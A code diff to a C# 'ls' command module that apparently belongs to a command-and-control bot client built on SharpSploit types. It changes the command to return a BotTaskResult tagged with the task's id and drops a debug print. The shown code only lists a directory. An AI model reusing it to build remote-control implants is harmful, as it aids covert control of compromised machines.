@@ -1,7 +1,6 @@
 ﻿using pattaya_project_client.Commands.Interfaces;
 using pattaya_project_client.Models;
 using pattaya_project_client.Services;
-using System;
 using System.Collections.Generic;
 using System.IO;
 
@@ -11,12 +10,11 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "ls";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
             var results = new SharpSploitResultList<ListDirectoryResult>();
             string path;
             var arguments = task.Arguments.Split(' ');
-            Console.WriteLine(arguments[0]);
             if (arguments is null || arguments.Length == 0 || arguments[0] == "")
             {
                 path = Directory.GetCurrentDirectory();
@@ -49,7 +47,11 @@ namespace pattaya_project_client.Commands.Implements
                 });
             }
 
-            return results.ToString();
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = results.ToString()
+        };
 
         }
     }
